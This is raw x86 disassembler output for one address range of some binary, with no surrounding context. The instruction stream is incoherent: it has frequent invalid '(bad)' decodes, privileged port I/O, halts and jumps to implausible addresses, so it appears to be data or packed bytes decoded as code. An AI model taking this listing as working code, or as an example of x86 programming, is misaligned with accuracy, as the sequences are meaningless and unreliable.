  4098c1:	cld    
  4098c2:	mov    eax,ds:0x42e9d488
  4098c7:	inc    edx
  4098c8:	outs   dx,BYTE PTR ds:[esi]
  4098c9:	add    BYTE PTR [ecx],0xe8
  4098cc:	fdivr  st(4),st
  4098cf:	mov    esp,0x8ffb333e
  4098d4:	lahf   
  4098d5:	cmc    
  4098d6:	sub    edx,DWORD PTR [edx-0x19269241]
  4098dc:	mov    eax,0x45c1d7f2
  4098e1:	jb     0x4098f4
  4098e3:	mov    dh,cl
  4098e5:	lods   eax,DWORD PTR ds:[esi]
  4098e6:	mov    eax,0x8c65054f
  4098eb:	dec    edi
  4098ec:	call   0xb961e74d
  4098f1:	aad    0x64
  4098f3:	into   
  4098f4:	mov    edi,0x6e5656ef
  4098f9:	sbb    BYTE PTR [esi-0x32fc664e],al
  4098ff:	test   DWORD PTR [ecx],ebp
  409901:	pop    edi
  409902:	mov    ?,eax
  409904:	xchg   ebp,eax
  409905:	mov    esp,0xb9e96b67
  40990a:	int3   
  40990b:	push   ebp
  40990c:	repz inc esi
  40990e:	xchg   dl,bl
  409910:	inc    esp
  409911:	in     al,0xd8
  409913:	imul   ebp,ebx,0x5d
  409916:	jo     0x40992f
  409918:	adc    eax,0xf7cb4eb4
  40991d:	xchg   DWORD PTR [edi+0x7f],edx
  409920:	push   ebx
  409921:	fadd   DWORD PTR [ecx-0x7c]
  409924:	in     al,dx
  409925:	xor    al,cl
  409927:	cmp    al,al
  409929:	(bad)  
  40992b:	sub    edx,ebp
  40992d:	adc    DWORD PTR [ebp-0x48],0x52
  409931:	sahf   
  409932:	mov    cl,0x0
  409934:	sub    ah,bl
  409936:	xor    BYTE PTR ds:0xd6446c1d,ah
  40993c:	shl    BYTE PTR [ebp-0x586efe8d],0x10
  409943:	inc    ecx
  409944:	out    dx,eax
  409945:	stos   DWORD PTR es:[edi],eax
  409946:	gs pop ds
  409948:	add    BYTE PTR [edx-0x77],dh
  40994b:	in     al,dx
  40994c:	cmp    esp,DWORD PTR [ebx+0x25]
  40994f:	retf   0xf347
  409952:	pop    esp
  409953:	gs jp  0x40995e
  409956:	jo     0x4099d7
  409958:	xor    BYTE PTR [ebp+ebx*1-0x2539e0ee],dl
  40995f:	mov    edx,0x7ff893a3
  409964:	repnz mov ebp,0xb4042721
  40996a:	mov    esp,0x170d5e55
  40996f:	lds    edx,FWORD PTR [ebx]
  409971:	xchg   ebp,eax
  409972:	nop
  409973:	stc    
  409974:	xor    dh,BYTE PTR [eax-0x67]
  409977:	das    
  409978:	test   DWORD PTR [esi+eax*2],ebx
  40997b:	iret   
  40997c:	push   edx
  40997d:	fwait
  40997e:	inc    esp
  40997f:	xor    eax,0x225b4460
  409984:	es push ebx
  409986:	adc    esi,DWORD PTR [esi+0x64]
  409989:	sysenter 
  40998b:	sbb    DWORD PTR [ecx+0x54],0xffffff9d
  40998f:	xor    al,0x90
  409991:	mov    edi,0xe5a455b0
  409996:	fisubr WORD PTR [ebx+eiz*2-0xfa78ba8]
  40999d:	xor    BYTE PTR [edi-0x66c342fa],ah
  4099a3:	xchg   esp,edi
  4099a5:	jb     0x40992b
  4099a7:	pop    ecx
  4099a8:	aaa    
  4099a9:	jno    0x409943
  4099ab:	dec    ecx
  4099ac:	lods   eax,DWORD PTR ds:[esi]
  4099ad:	mov    BYTE PTR [ecx-0x22],ah
  4099b0:	int    0xe8
  4099b2:	es call 0xa255464c
  4099b8:	icebp  
  4099b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099ba:	push   ebp
  4099bb:	fwait
  4099bc:	add    bl,BYTE PTR [esi+edx*4+0x2e18274f]
  4099c3:	repz adc BYTE PTR [edi+eax*2-0x66fb3c57],bh
  4099cb:	rcr    dl,1
  4099cd:	jp     0x4099b5
  4099cf:	rcr    DWORD PTR [edx-0x198d31de],1
  4099d5:	loop   0x4099f6
  4099d7:	popa   
  4099d8:	arpl   dx,di
  4099da:	xchg   ebx,eax
  4099db:	add    DWORD PTR [esp+eax*2],esp
  4099de:	inc    esi
  4099df:	call   0xfe76:0xb57d6f5f
  4099e6:	xchg   esp,eax
  4099e7:	add    al,0x42
  4099e9:	std    
  4099ea:	hlt    
  4099eb:	mov    bl,0x93
  4099ed:	cmp    ebx,DWORD PTR ds:0x47ad6c52
  4099f3:	inc    esp
  4099f4:	enter  0xd050,0xab
  4099f8:	mov    ds:0x276196eb,eax
  4099fd:	sbb    al,0xe2
  4099ff:	and    edi,DWORD PTR [esi+0x5075969e]
  409a05:	jns    0x4099da
  409a07:	mov    ds:0x96c14cff,al
  409a0c:	lahf   
  409a0d:	cmp    cl,ch
  409a0f:	into   
  409a10:	sbb    al,0x15
  409a12:	or     BYTE PTR [eax+edx*1+0x50c3e96],dl
  409a19:	in     eax,0x3d
  409a1b:	sbb    esi,DWORD PTR [esi+edx*2-0x5c]
  409a1f:	mov    BYTE PTR [ebx],al
  409a21:	(bad)  
  409a22:	adc    eax,0x24cab534
  409a27:	push   edx
  409a28:	fadd   QWORD PTR [ebx-0x7f855976]
  409a2e:	cli    
  409a2f:	dec    eax
  409a30:	icebp  
  409a31:	out    0x69,eax
  409a33:	cmp    eax,0x69a0e72e
  409a38:	jnp    0x4099e9
  409a3a:	arpl   di,di
  409a3c:	pusha  
  409a3d:	adc    eax,0x668fe2a1
  409a42:	add    al,0xee
  409a44:	inc    edi
  409a45:	outs   dx,BYTE PTR ds:[esi]
  409a46:	mov    esi,0x64f0d518
  409a4b:	mov    ah,ah
  409a4d:	and    eax,0xdb1b9ef
  409a52:	add    al,0xd0
  409a54:	mov    eax,ds:0x92709ba8
  409a59:	sahf   
  409a5a:	repnz mov bl,0x1a
  409a5d:	lods   al,BYTE PTR ds:[esi]
  409a5e:	call   0xd103:0x45b85a97
  409a65:	inc    ebp
  409a66:	cwde   
  409a67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a68:	mov    ecx,0xab3c2d6f
  409a6d:	add    DWORD PTR [edx-0x67],edi
  409a70:	mov    dl,0x27
  409a72:	inc    ebp
  409a73:	add    eax,0x2b6a937d
  409a78:	mov    al,0x62
  409a7a:	mov    bl,BYTE PTR [ecx+0x2bb51d56]
  409a80:	dec    edi
  409a81:	loope  0x409a06
  409a83:	mov    cl,0xa0
  409a85:	mov    edx,0x587b40ed
  409a8a:	mov    ds:0xc983c2b0,al
  409a8f:	mov    DWORD PTR [ecx+0x74],edx
  409a92:	mov    ah,0xed
  409a94:	in     eax,dx
  409a95:	dec    edi
  409a96:	lahf   
  409a97:	inc    ecx
  409a98:	and    eax,eax
  409a9a:	jne    0x409a92
  409a9c:	xor    dh,dl
  409a9e:	std    
  409a9f:	inc    eax
  409aa0:	add    ah,BYTE PTR [ebp+0x1dc3abea]
  409aa6:	adc    al,0x14
  409aa8:	not    DWORD PTR [ecx-0x47]
  409aab:	ret    0x20c8
  409aae:	out    dx,eax
  409aaf:	repz cwde 
  409ab1:	push   edi
  409ab2:	cwde   
  409ab3:	cmp    eax,0x88fcbad1
  409ab8:	out    dx,al
  409ab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409aba:	jmp    0x409a49
  409abc:	and    ecx,DWORD PTR [esi+0x4b]
  409abf:	cmp    al,0x5c
  409ac1:	add    eax,0x12dcdd7e
  409ac6:	sub    eax,0x5b7e4123
  409acb:	adc    eax,edi
  409acd:	inc    edx
  409ace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409acf:	mov    esi,0x61e06d56
  409ad4:	mov    ah,0x9d
  409ad6:	push   esp
  409ad7:	and    DWORD PTR ds:0xda6f5309,edx
  409add:	div    BYTE PTR [edi+0x2b]
  409ae0:	(bad)  
  409ae1:	pop    ecx
  409ae2:	push   ebp
  409ae3:	inc    ebp
  409ae4:	jle    0x409b37
  409ae6:	adc    dh,BYTE PTR [esi+0x62]
  409ae9:	das    
  409aea:	adc    DWORD PTR [edx],0xffffff82
  409aed:	(bad)  
  409aee:	jnp    0x409ada
  409af0:	std    
  409af1:	rol    BYTE PTR [ebx+0x35],0x65
  409af5:	daa    
  409af6:	pop    ebx
  409af7:	jae    0x409b5e
  409af9:	imul   esp,DWORD PTR [ebx+0x58e23715],0x59db9127
  409b03:	fwait
  409b04:	pop    eax
  409b05:	out    dx,al
  409b06:	dec    esp
  409b07:	ret    0x4997
  409b0a:	push   0xb661a871
  409b0f:	or     edi,DWORD PTR [esi-0x2efd8bc]
  409b15:	iret   
  409b16:	retf   0xebf0
  409b19:	je     0x409aa8
  409b1b:	jp     0x409b90
  409b1d:	stos   DWORD PTR es:[edi],eax
  409b1e:	mov    ds:0x149cdc1a,al
  409b23:	jmp    0x8f685008
  409b28:	sub    eax,0xba364d7e
  409b2d:	sbb    BYTE PTR [eax],dl
  409b2f:	retf   
  409b30:	mov    edi,0x3df39682
  409b35:	fsubr  DWORD PTR [ebp+ebx*8+0x5177e7d1]
  409b3c:	mov    edi,0x8de15513
  409b41:	scas   al,BYTE PTR es:[edi]
  409b42:	push   esi
  409b43:	push   esp
  409b44:	mov    ebp,0xf591aad5
  409b49:	aam    0xb2
  409b4b:	xchg   edx,eax
  409b4c:	and    DWORD PTR [ebx-0x58c3c096],esp
  409b52:	jmp    FWORD PTR [edi+edi*2-0x2835271e]
  409b59:	sbb    edi,DWORD PTR [esi]
  409b5b:	ret    0x180
  409b5e:	cmc    
  409b5f:	and    BYTE PTR [ecx],dl
  409b61:	inc    esi
  409b62:	xor    BYTE PTR [eax+ebx*4-0x469b9fe9],dh
  409b69:	mov    edx,0xbd450c77
  409b6e:	bound  esp,QWORD PTR [esi-0x22574894]
  409b74:	or     BYTE PTR [edx+0x44c33688],dl
  409b7a:	jmp    0x4e4a2dfb
  409b7f:	pop    edi
  409b80:	jnp    0x409be9
  409b82:	data16 sbb ah,BYTE PTR [ebp+0x56157c35]
  409b89:	repz dec ecx
  409b8b:	or     eax,0x5841240c
  409b90:	fcom   QWORD PTR [ecx]
  409b92:	int3   
  409b93:	test   BYTE PTR [ebx+0x31],ch
  409b96:	nop
  409b97:	out    0x9d,eax
  409b99:	std    
  409b9a:	mov    edi,0xdf6ada3d
  409b9f:	adc    bl,bl
  409ba1:	jg     0x409be4
  409ba3:	inc    ecx
  409ba4:	sub    DWORD PTR [esi],esi
  409ba6:	cmp    DWORD PTR [eax+0x1f],esp
  409ba9:	aam    0x99
  409bab:	mov    eax,ds:0x91ea2cf6
  409bb0:	(bad)  
  409bb1:	and    eax,0xa0086ef0
  409bb6:	push   edx
  409bb7:	inc    ebx
  409bb8:	mov    edx,DWORD PTR [esp+edi*2]
  409bbb:	jle    0x409be2
  409bbd:	popa   
  409bbe:	pushf  
  409bbf:	hlt    
  409bc0:	inc    esi
  409bc1:	fwait
  409bc2:	xchg   ecx,eax
  409bc3:	jge    0x409ba5
  409bc5:	test   al,0x6f
  409bc7:	adc    al,0x52
  409bc9:	add    eax,DWORD PTR [ecx+0xc]
  409bcc:	mov    edi,0x46928f81
  409bd1:	adc    al,0xff
  409bd3:	test   al,0xe1
  409bd5:	std    
  409bd6:	mov    cl,0xa4
  409bd8:	jnp    0x409bd0
  409bda:	mov    dl,0xf2
  409bdc:	lea    edx,[ecx+0x45]
  409bdf:	or     edi,DWORD PTR [esp+ecx*1]
  409be2:	dec    ecx
  409be3:	sbb    eax,0x65508431
  409be8:	jg     0x409b9d
  409bea:	loop   0x409c0d
  409bec:	daa    
  409bed:	sbb    al,0x23
  409bef:	sbb    al,0x2c
  409bf1:	pop    ss
  409bf2:	mov    bl,0x35
  409bf4:	add    esi,esi
  409bf6:	mov    DWORD PTR [ebx+0x589f369],0x8c0ae263
  409c00:	loopne 0x409c1d
  409c02:	xchg   esi,eax
  409c03:	push   edx
  409c04:	fnstenv [edi]
  409c06:	jmp    0x409c16
  409c08:	adc    DWORD PTR [esi+0x57],esi
  409c0b:	sbb    ch,cl
  409c0d:	xchg   esi,eax
  409c0e:	fwait
  409c0f:	inc    esi
  409c10:	rcr    BYTE PTR [esi*1-0x16490ca0],cl
  409c17:	fwait
  409c18:	hlt    
  409c19:	and    al,0x31
  409c1b:	loope  0x409c9c
  409c1d:	pop    ebx
  409c1e:	mov    esi,0x7d8d2c02
  409c23:	dec    edi
  409c24:	test   BYTE PTR [esi],dh
  409c26:	fnsave [ecx+esi*1]
  409c29:	stos   BYTE PTR es:[edi],al
  409c2a:	pop    ebx
  409c2b:	and    bl,BYTE PTR [ecx-0x3a]
  409c2e:	(bad)  
  409c2f:	pushf  
  409c30:	loope  0x409c4e
  409c32:	iret   
  409c33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c34:	jne    0x409bc6
  409c36:	mov    dh,bl
  409c38:	push   ds
  409c39:	popa   
  409c3a:	add    eax,0xc3ecc1f2
  409c3f:	test   edx,esi
  409c41:	sbb    ch,BYTE PTR [ebx+edx*1+0x50]
  409c45:	aad    0x95
  409c47:	jae    0x409bdd
  409c49:	push   edi
  409c4a:	push   ss
  409c4b:	jae    0x409c69
  409c4d:	les    ecx,FWORD PTR [eax+0x36]
  409c50:	or     eax,0xa7b6a943
  409c55:	les    ebx,FWORD PTR [esi]
  409c57:	js     0x409c87
  409c59:	btr    esi,esi
  409c5c:	into   
  409c5d:	push   0x3c52e9aa
  409c62:	and    bh,BYTE PTR [esi]
  409c64:	pushf  
  409c65:	sahf   
  409c66:	fistp  DWORD PTR [eax+0x2cb88275]
  409c6c:	jmp    0xa3ff38f8
  409c71:	or     BYTE PTR [edi],ah
  409c73:	in     eax,0xf9
  409c75:	repnz and BYTE PTR [ecx-0x20],ah
  409c79:	(bad)  
  409c7a:	pop    esi
  409c7b:	ins    BYTE PTR es:[edi],dx
  409c7c:	push   ss
  409c7d:	sar    DWORD PTR [ecx-0xe317cc6],cl
  409c83:	ret    0x900f
  409c86:	cdq    
  409c87:	ins    DWORD PTR es:[edi],dx
  409c88:	inc    ebp
  409c89:	jp     0x409cf1
  409c8b:	icebp  
  409c8c:	lds    esp,FWORD PTR [eax-0x459f6677]
  409c92:	push   edi
  409c93:	daa    
  409c94:	ds cmp dh,dl
  409c97:	pop    es
  409c98:	mov    edx,0xa6120b52
  409c9d:	fmul   st,st(4)
  409c9f:	dec    esi
  409ca0:	retf   0x56d0
  409ca3:	pop    es
  409ca4:	aam    0x70
  409ca6:	lock mov ebp,0xc324d4c7
  409cac:	bound  ecx,QWORD PTR [ecx-0x250107b7]
  409cb2:	pop    esp
  409cb3:	int3   
  409cb4:	pop    ebx
  409cb5:	leave  
  409cb6:	jbe    0x409c38
  409cb8:	pop    edx
  409cb9:	or     dh,dh
  409cbb:	jne    0x409cee
  409cbd:	(bad)  
  409cbe:	jle    0x409cf4
  409cc0:	cmp    DWORD PTR [esi+ebx*2+0x4f],0x57
  409cc5:	dec    DWORD PTR [eax]
  409cc7:	xor    ebp,DWORD PTR [edi+0x73486e1b]
  409ccd:	xchg   ebp,eax
  409cce:	inc    ecx
  409ccf:	out    0x22,al
  409cd1:	imul   esi,DWORD PTR [edx-0x1b],0xffffff9c
  409cd5:	adc    al,0xfc
  409cd7:	adc    edx,eax
  409cd9:	add    BYTE PTR [ebp-0x6f],0x57
  409cdd:	ds loop 0x409d44
  409ce0:	push   0xffffffca
  409ce2:	(bad)
  409ce5:	jle    0x409c8b
  409ce7:	adc    BYTE PTR [edi],ch
  409ce9:	data16 into 
  409ceb:	data16 (bad) [esi]
  409cee:	sbb    DWORD PTR [eax+ecx*1],esp
  409cf1:	pop    esi
  409cf2:	aad    0xae
  409cf4:	inc    ebp
  409cf5:	push   0xd7f5d5fa
  409cfa:	and    ah,0x58
  409cfd:	repnz out dx,eax
  409cff:	test   eax,0x80a1046f
  409d04:	mov    ebx,0xa045b6c1
  409d09:	int3   
  409d0a:	dec    esp
  409d0b:	xchg   edx,eax
  409d0c:	jmp    0xb6c3:0x88495755
  409d13:	pop    es
  409d14:	data16 xor BYTE PTR [eax-0x79],bh
  409d18:	mov    esi,DWORD PTR [ebx+0x62de8800]
  409d1e:	fxam   
  409d20:	adc    edi,DWORD PTR [ecx-0x34]
  409d23:	imul   eax,DWORD PTR [ebp-0x7a],0x11
  409d27:	lahf   
  409d28:	hlt    
  409d29:	ret    0x7ed
  409d2c:	fmul   st,st(3)
  409d2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d2f:	ror    DWORD PTR [esi+0x18],cl
  409d32:	ret    0x6281
  409d35:	pop    ds
  409d36:	aad    0xb0
  409d38:	dec    edx
  409d39:	jbe    0x409db0
  409d3b:	jg     0x409d10
  409d3d:	cs sub ebp,edi
  409d40:	das    
  409d41:	sub    DWORD PTR [eax],ebp
  409d43:	adc    dh,ah
  409d45:	jle    0x409d8c
  409d47:	push   ss
  409d48:	cmp    al,0x32
  409d4a:	xchg   edx,eax
  409d4b:	stc    
  409d4c:	jae    0x409d85
  409d4e:	lock sar BYTE PTR ss:[eax-0x9],1
  409d53:	sbb    eax,0x11189b1e
  409d58:	push   0x4
  409d5a:	cmp    eax,0xb094b012
  409d5f:	call   0xb581eecb
  409d64:	lds    eax,FWORD PTR [esp+eiz*8-0x7af2f4b6]
  409d6b:	stos   BYTE PTR es:[edi],al
  409d6c:	add    dl,BYTE PTR [edx]
  409d6e:	sbb    BYTE PTR [esi],ah
  409d70:	aad    0xdf
  409d72:	imul   esp,DWORD PTR [ebx],0x53
  409d75:	and    bl,BYTE PTR [eax+eax*4-0x2]
  409d79:	in     eax,dx
  409d7a:	xor    ecx,ecx
  409d7c:	push   0x5d9bff7
  409d81:	das    
  409d82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d83:	push   cs
  409d84:	std    
  409d85:	push   ds
  409d86:	push   ebp
  409d87:	sbb    al,0x44
  409d89:	jecxz  0x409d71
  409d8b:	pop    esi
  409d8c:	and    al,0x7d
  409d8e:	add    DWORD PTR [edi-0x4e],eax
  409d91:	push   edi
  409d92:	pop    ecx
  409d93:	(bad)  
  409d95:	jg     0x409dd5
  409d97:	and    BYTE PTR [eax+edx*4+0x3617412],bh
  409d9e:	mov    ebp,0x17615d97
  409da3:	dec    ecx
  409da4:	cmp    al,0x84
  409da6:	xor    ebx,eax
  409da8:	add    eax,0xa3923547
  409dad:	mov    edi,0x955f6b8a
  409db2:	test   al,0xd1
  409db4:	xchg   DWORD PTR [ecx-0x6e],ecx
  409db7:	push   esp
  409db8:	leave  
  409db9:	loope  0x409dfa
  409dbb:	xor    DWORD PTR [edi-0x35d32691],edi
  409dc1:	shl    DWORD PTR [ecx],cl
  409dc3:	dec    esi
  409dc4:	pop    ecx
  409dc6:	add    DWORD PTR [ecx-0x25],0x1846977b
  409dcd:	jl     0x409db7
  409dcf:	sbb    eax,0xde4ad773
  409dd4:	lods   al,BYTE PTR ds:[esi]
  409dd5:	ficomp DWORD PTR ss:[ebp-0x70]
  409dd9:	push   ds
  409dda:	mov    ah,0x65
  409ddc:	dec    edx
  409ddd:	fisttp WORD PTR [edx+0xa]
  409de0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409de1:	out    dx,al
  409de2:	ror    esp,1
  409de4:	sbb    eax,0xd1b0ec1d
  409de9:	(bad)  
  409dea:	ficomp DWORD PTR [ecx+0xb307f26]
  409df0:	push   edx
  409df1:	imul   eax,DWORD PTR [edx-0x57],0x60855370
  409df8:	sbb    al,0x36
  409dfa:	jmp    0x95dbd650
  409dff:	int3   
  409e00:	jmp    0x409e19
  409e02:	nop
  409e03:	fwait
  409e04:	sti    
  409e05:	xchg   ebx,eax
  409e06:	push   ebx
  409e07:	popa   
  409e08:	mov    bh,0x27
  409e0a:	call   0x5609a7cb
  409e0f:	aad    0xdb
  409e11:	test   DWORD PTR [ebx+0x27],eax
  409e14:	or     al,0xc4
  409e16:	rcr    ebx,cl
  409e18:	xchg   edx,eax
  409e19:	les    ecx,FWORD PTR [eax]
  409e1b:	std    
  409e1c:	das    
  409e1d:	sti    
  409e1e:	mov    ebx,0xf746f711
  409e23:	dec    dl
  409e25:	xor    al,0x18
  409e27:	clc    
  409e28:	dec    eax
  409e29:	or     eax,0x48f08499
  409e2e:	dec    ebx
  409e2f:	xchg   edi,eax
  409e30:	push   ecx
  409e31:	ret    
  409e32:	sub    ebp,ebx
  409e34:	std    
  409e35:	pop    es
  409e36:	lds    esp,FWORD PTR [ebx+0x212381c]
  409e3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e3d:	and    eax,eax
  409e3f:	fdivr  DWORD PTR [eax+0x2f921ab1]
  409e45:	enter  0xa5af,0xea
  409e49:	sbb    al,0xc3
  409e4b:	in     eax,0x5a
  409e4d:	xlat   BYTE PTR ds:[ebx]
  409e4e:	or     edi,DWORD PTR [edx+0x5e]
  409e51:	cmp    DWORD PTR [edx+0xa352546],ebx
  409e57:	(bad)  
  409e58:	jno    0x409ead
  409e5a:	leave  
  409e5b:	pop    ss
  409e5c:	pusha  
  409e5d:	pop    ebp
  409e5e:	outs   dx,BYTE PTR ds:[esi]
  409e5f:	fidiv  DWORD PTR [eax]
  409e61:	adc    BYTE PTR [ebx+ebp*1+0x54],al
  409e65:	jb     0x409e4a
  409e67:	rcr    DWORD PTR [ebp+0x34],cl
  409e6a:	fsubr  st,st(5)
  409e6c:	ds out 0x3e,eax
  409e6f:	int3   
  409e70:	jns    0x409eeb
  409e72:	outs   dx,DWORD PTR ds:[esi]
  409e73:	movups XMMWORD PTR [edx+ebx*1-0x78],xmm5
  409e78:	cmp    al,0xd2
  409e7a:	jmp    0xba72:0xb2fcfebd
  409e81:	cmp    DWORD PTR [eax+0x18],eax
  409e84:	neg    BYTE PTR [edx+eax*2]
  409e87:	or     bh,cl
  409e89:	jbe    0x409e87
  409e8b:	pop    ebx
  409e8c:	mov    bl,0x86
  409e8e:	clc    
  409e8f:	sbb    ebp,ecx
  409e91:	call   DWORD PTR [eax+0x6bb03f22]
  409e97:	sub    DWORD PTR ds:0x3e102fc9,0xffffff99
  409e9e:	dec    ebp
  409e9f:	data16 fiadd WORD PTR [ecx-0x6bffef37]
  409ea6:	lea    esp,[edx]
  409ea8:	fsub   DWORD PTR [ecx-0x29]
  409eab:	jp     0x409e32
  409ead:	scas   al,BYTE PTR es:[edi]
  409eae:	popf   
  409eaf:	test   al,0xc6
  409eb1:	xchg   esi,eax
  409eb2:	xchg   BYTE PTR [ebx],dl
  409eb4:	adc    BYTE PTR [edx+0x3546272b],0x13
  409ebb:	ret    
  409ebc:	adc    DWORD PTR [eax+0xcb32f59],ecx
  409ec2:	js     0x409ee1
  409ec4:	mov    esp,0xa4f93a35
  409ec9:	jge    0x409efe
  409ecb:	xchg   ebp,eax
  409ecc:	shl    DWORD PTR [edx+0x4c378081],cl
  409ed2:	mov    WORD PTR [esi+0x62],?
  409ed5:	or     eax,0x2fbfdfab
  409eda:	movupd xmm5,xmm0
  409ede:	gs cmp ebx,0x1f
  409ee2:	mov    bl,0x65
  409ee4:	pop    esp
  409ee5:	adc    BYTE PTR [ecx+esi*1-0x374a8bd9],0x6
  409eed:	fsub   DWORD PTR [ebx-0x6375bc14]
  409ef3:	mov    edi,0x729c1e1b
  409ef8:	sub    DWORD PTR [eax],ebp
  409efa:	xchg   BYTE PTR [edi-0x30],bh
  409efd:	push   ds
  409efe:	dec    esp
  409eff:	adc    eax,0xa503aeda
  409f04:	mov    es,WORD PTR [edi+esi*4+0x28]
  409f08:	cs retf 
  409f0a:	mov    ds:0x92756fe5,al
  409f0f:	out    dx,al
  409f10:	cmp    eax,0xfe6a0b6f
  409f15:	xor    BYTE PTR [edx-0x67a468de],bl
  409f1b:	adc    al,0xfd
  409f1d:	jo     0x409f09
  409f1f:	lock ja 0x409ec2
  409f22:	loopne 0x409f97
  409f24:	xor    al,0xe4
  409f26:	ja     0x409ed5
  409f28:	(bad)  
  409f2a:	stc    
  409f2b:	dec    ebp
  409f2c:	popf   
  409f2d:	xchg   ebx,eax
  409f2e:	push   ecx
  409f2f:	fiadd  WORD PTR [edi+0x50]
  409f32:	mov    cl,0xed
  409f34:	mov    eax,ds:0x189dfe9
  409f39:	bound  esi,QWORD PTR [esi-0x6e944b09]
  409f3f:	adc    edx,ebp
  409f41:	jg     0x409fb3
  409f43:	add    BYTE PTR [ecx+0x35],0x63
  409f47:	repz es loope 0x409ef9
  409f4b:	shl    DWORD PTR [ecx],1
  409f4d:	mov    ebx,0xdcb26b31
  409f52:	adc    DWORD PTR [ecx],edx
  409f54:	jns    0x409f7d
  409f56:	iret   
  409f57:	out    0xf8,al
  409f59:	ja     0x409ee7
  409f5b:	iret   
  409f5c:	cmc    
  409f5d:	clc    
  409f5e:	sti    
  409f5f:	mov    dl,0x40
  409f61:	sub    DWORD PTR [edx-0x6f12c4e8],0xffffffbe
  409f68:	push   esi
  409f69:	test   DWORD PTR [esi-0x41ae1b7],ebx
  409f6f:	inc    ebx
  409f70:	push   esi
  409f71:	outs   dx,DWORD PTR ds:[esi]
  409f72:	ins    DWORD PTR es:[edi],dx
  409f73:	inc    ebx
  409f74:	(bad)
  409f78:	lds    ecx,FWORD PTR [edx+0x4f]
  409f7b:	lds    ecx,FWORD PTR [ecx]
  409f7d:	cmc    
  409f7e:	aaa    
  409f7f:	out    dx,eax
  409f80:	push   0x20
  409f82:	pusha  
  409f83:	ror    bl,0x4d
  409f86:	adc    edx,DWORD PTR [eax+0x2e]
  409f89:	cmp    DWORD PTR [ebp+0x626adad9],ebp
  409f8f:	push   es
  409f90:	push   ebp
  409f91:	pop    ebp
  409f92:	mov    edx,0xdbfc6349
  409f97:	pop    esp
  409f98:	pop    esi
  409f99:	retf   0x3d1c
  409f9c:	sbb    edi,DWORD PTR [edi]
  409f9e:	push   ecx
  409f9f:	pop    ecx
  409fa0:	mov    ebp,0xeabd7557
  409fa5:	push   ebp
  409fa6:	jno    0x40a017
  409fa8:	sub    eax,0x928a38fd
  409fad:	cmp    esp,edi
  409faf:	retf   
  409fb0:	mov    ah,0x32
  409fb2:	sub    BYTE PTR [eax-0xea66c55],al
  409fb8:	sbb    eax,0x48851100
  409fbd:	fisttp DWORD PTR [ebx]
  409fbf:	xchg   ecx,eax
  409fc0:	retf   
  409fc1:	dec    ebp
  409fc2:	sti    
  409fc3:	push   ecx
  409fc4:	arpl   WORD PTR [ebx-0x3e635661],cx
  409fca:	test   eax,0x91218988
  409fcf:	adc    BYTE PTR [ebx],al
  409fd1:	jno    0x409f74
  409fd3:	xchg   BYTE PTR [edi],ah
  409fd5:	adc    al,0x6
  409fd7:	mov    eax,0xd4ed9115
  409fdc:	jmp    0x93f88beb
  409fe1:	mov    ch,0x4d
  409fe3:	and    eax,0x859ea670
  409fe8:	push   ss
  409fe9:	je     0x409fb4
  409feb:	loope  0x409fa8
  409fed:	ret    0xa8cb
  409ff0:	and    al,BYTE PTR [eax+0x19]
  409ff3:	cwde   
  409ff4:	mov    dl,0xb7
  409ff6:	push   ebx
  409ff7:	pop    eax
  409ff8:	xchg   ecx,eax
  409ff9:	mov    dh,0xb9
  409ffb:	xchg   esp,eax
  409ffc:	scas   al,BYTE PTR es:[edi]
  409ffd:	jg     0x409f88
  409fff:	xchg   ecx,eax
  40a000:	int    0x12
  40a002:	clc    
  40a003:	adc    BYTE PTR [edx-0x6d],ch
  40a006:	fdiv   QWORD PTR ds:0xaf209525
  40a00c:	xlat   BYTE PTR ds:[ebx]
  40a00d:	fneni(8087 only) 
  40a00f:	xchg   esp,eax
  40a010:	(bad)  
  40a011:	(bad)  
  40a012:	adc    DWORD PTR [edi-0x5c],edx
  40a015:	(bad)  
  40a016:	cmc    
  40a017:	outs   dx,DWORD PTR ds:[esi]
  40a018:	push   ecx
  40a019:	mov    ebp,0x407a7b30
  40a01e:	fild   WORD PTR [eax+eiz*4]
  40a021:	(bad)  
  40a022:	mov    cl,0x85
  40a024:	lock ja 0x409ffa
  40a027:	fisubr DWORD PTR [eax]
  40a029:	sbb    DWORD PTR [esi-0x66],edi
  40a02c:	je     0x40a052
  40a02e:	int3   
  40a02f:	(bad)  
  40a030:	mov    ds:0xe00c66dd,al
  40a035:	mov    cl,0x87
  40a037:	push   esi
  40a038:	and    esp,DWORD PTR [esi+0x7218abab]
  40a03e:	or     al,0x5b
  40a040:	leave  
  40a041:	pop    ecx
  40a042:	add    esp,DWORD PTR [ecx-0x6f]
  40a045:	out    dx,al
  40a046:	push   ss
  40a047:	xor    DWORD PTR [esi],eax
  40a049:	push   esi
  40a04a:	fwait
  40a04b:	or     al,0xd5
  40a04d:	inc    ecx
  40a04e:	cmp    esi,ebx
  40a050:	xchg   ebp,esi
  40a052:	cmp    DWORD PTR [ebx-0x18100d20],ecx
  40a058:	call   0x5bc0459a
  40a05d:	ds sbb edi,esp
  40a060:	sub    al,0x3a
  40a062:	test   eax,0xa7c396a1
  40a067:	xor    edi,DWORD PTR [ebx-0x56]
  40a06a:	jmp    0x54f843ce
  40a06f:	xor    ebx,DWORD PTR [edi+0x50]
  40a072:	gs adc eax,0xb7971c17
  40a078:	dec    esi
  40a079:	mov    BYTE PTR [ecx],ah
  40a07b:	ror    DWORD PTR [ebx],0x67
  40a07e:	pusha  
  40a07f:	in     al,0xf9
  40a081:	pusha  
  40a082:	dec    ecx
  40a083:	lods   eax,DWORD PTR ds:[esi]
  40a084:	mov    dh,dl
  40a086:	cmp    DWORD PTR [eax],0x59
  40a089:	and    edx,ecx
  40a08b:	out    dx,al
  40a08c:	pop    ebp
  40a08d:	out    0x8e,al
  40a08f:	jmp    0x40a02c
  40a091:	(bad)  
  40a092:	adc    al,0x70
  40a094:	(bad)  
  40a095:	mov    eax,0xe13915e2
  40a09a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a09b:	dec    ebx
